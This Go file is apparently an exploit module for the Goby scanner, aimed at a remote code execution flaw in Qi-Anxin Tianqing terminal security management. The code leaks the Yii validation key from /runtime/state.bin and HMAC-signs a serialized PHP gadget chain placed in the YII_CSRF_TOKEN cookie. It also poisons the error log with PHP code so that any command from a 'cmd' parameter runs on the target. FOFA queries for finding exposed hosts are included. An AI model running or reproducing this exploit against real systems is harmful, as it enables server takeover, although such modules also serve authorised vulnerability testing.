package exploits

import (
	"crypto/hmac"
	"crypto/sha1"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tianqing terminal security management system YII_CSRF_TOKEN remote code execution vulnerability",
    "Description": "<p>Qi Anxin Tianqing is a terminal security management system (referred to as \"Tianqing\") product of Qi Anxin Group dedicated to integrated terminal security solutions.</p><p>The web part of Qi'an Xintianqing terminal security management system uses the yii framework. This version of the framework has its own deserialization entry point, and the attacker can execute arbitrary code to obtain server permissions.</p>",
    "Product": "Qianxin-TianQing",
    "Homepage": "https://www.qianxin.com/",
    "DisclosureDate": "2023-02-12",
    "Author": "h1ei1",
    "FofaQuery": "title=\"360新天擎\" || body=\"appid\\\":\\\"skylar6\" || body=\"/task/index/detail?id={item.id}\" || body=\"已过期或者未授权，购买请联系4008-136-360\" || title=\"360天擎\" || title=\"360天擎终端安全管理系统\"",
    "GobyQuery": "title=\"360新天擎\" || body=\"appid\\\":\\\"skylar6\" || body=\"/task/index/detail?id={item.id}\" || body=\"已过期或者未授权，购买请联系4008-136-360\" || title=\"360天擎\" || title=\"360天擎终端安全管理系统\"",
    "Level": "3",
    "Impact": "<p>The web part of Qi'an Xintianqing terminal security management system uses the yii framework. This version of the framework has its own deserialization entry point, and the attacker can execute arbitrary code to obtain server permissions.</p>",
    "Recommendation": "<p>The manufacturer has released security patches, please update them in time: <a href=\"https://www.qianxin.com/.\">https://www.qianxin.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "system(\"whoami\")",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "天擎终端安全管理系统 YII_CSRF_TOKEN 远程代码执行漏洞",
            "Product": "奇安信-天擎",
            "Description": "<p>奇安信天擎是奇安信集团旗下一款致力于一体化终端安全解决方案的终端安全管理系统（简称“天擎”）产品。<br></p><p>奇安信天擎终端安全管理系统web部分使用yii框架 该版本框架自带反序列化入口点，攻击者可执行任意代码获取服务器权限。<br></p>",
            "Recommendation": "<p>厂商已发布安全补丁，请及时更新：<a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a>。<br></p>",
            "Impact": "<p>奇安信天擎终端安全管理系统web部分使用yii框架 该版本框架自带反序列化入口点，攻击者可执行任意代码获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "信创"
            ]
        },
        "EN": {
            "Name": "Tianqing terminal security management system YII_CSRF_TOKEN remote code execution vulnerability",
            "Product": "Qianxin-TianQing",
            "Description": "<p>Qi Anxin Tianqing is a terminal security management system (referred to as \"Tianqing\") product of Qi Anxin Group dedicated to integrated terminal security solutions.<br></p><p>The web part of Qi'an Xintianqing terminal security management system uses the yii framework. This version of the framework has its own deserialization entry point, and the attacker can execute arbitrary code to obtain server permissions.<br></p>",
            "Recommendation": "<p>The manufacturer has released security patches, please update them in time: <a href=\"https://www.qianxin.com/.\">https://www.qianxin.com/.</a><br></p>",
            "Impact": "<p>The web part of Qi'an Xintianqing terminal security management system uses the yii framework. This version of the framework has its own deserialization entry point, and the attacker can execute arbitrary code to obtain server permissions.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-06",
    "PocId": "10804"
}`

	sendPayloadFlagLN8b := func(hostInfo *httpclient.FixUrl, code string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/runtime/state.bin")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		rsp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return nil, err
		}
		if !strings.Contains(rsp.RawBody, "Yii.CSecurityManager.validationkey\";s:32:\"") {
			return nil, errors.New("漏洞不存在")
		}
		keyFind := regexp.MustCompile("Yii.CSecurityManager.validationkey\";s:32:\"(.*?)\";}").FindStringSubmatch(rsp.RawBody)
		textBytes := "O:24:\"Smarty_Internal_Template\":1:{s:6:\"smarty\";O:10:\"CWebModule\":2:{s:20:\"\u0000CModule\u0000_components\";a:0:{}s:25:\"\u0000CModule\u0000_componentConfig\";a:1:{s:13:\"cache_locking\";a:4:{s:5:\"class\";s:11:\"CUrlManager\";s:12:\"urlRuleClass\";s:14:\"CConfiguration\";s:5:\"rules\";a:1:{i:0;s:21:\"../www/logs/error.log\";}s:9:\"UrlFormat\";s:4:\"path\";}}}}"
		hash := hmac.New(sha1.New, []byte(keyFind[1]))
		hash.Write([]byte(textBytes))
		// yii 框架
		yiiCsrfToken := hash.Sum(nil)

		// 执行代码
		getRequestConfig.URI = fmt.Sprintf("/%%3Cscript+language=%%22php%%22%%3E%s;%%3C/script%%3E", url.QueryEscape(code))
		httpclient.DoHttpRequest(hostInfo, getRequestConfig)

		getRequestConfig.URI = "/login?refer=%2F"
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		getRequestConfig.Header.Store("Cookie", "YII_CSRF_TOKEN="+fmt.Sprintf("%x", yiiCsrfToken)+"O%3A24%3A%22Smarty_Internal_Template%22%3A1%3A%7Bs%3A6%3A%22smarty%22%3BO%3A10%3A%22CWebModule%22%3A2%3A%7Bs%3A20%3A%22%00CModule%00_components%22%3Ba%3A0%3A%7B%7Ds%3A25%3A%22%00CModule%00_componentConfig%22%3Ba%3A1%3A%7Bs%3A13%3A%22cache_locking%22%3Ba%3A4%3A%7Bs%3A5%3A%22class%22%3Bs%3A11%3A%22CUrlManager%22%3Bs%3A12%3A%22urlRuleClass%22%3Bs%3A14%3A%22CConfiguration%22%3Bs%3A5%3A%22rules%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A21%3A%22..%2Fwww%2Flogs%2Ferror.log%22%3B%7Ds%3A9%3A%22UrlFormat%22%3Bs%3A4%3A%22path%22%3B%7D%7D%7D%7D")
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadFlagLN8b(hostInfo, "echo md5(233)")
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			rsp, err := sendPayloadFlagLN8b(expResult.HostInfo, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			}
			if strings.Contains(rsp.Utf8Html, "exception.CHttpException") {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html
			}
			return expResult
		},
	))
}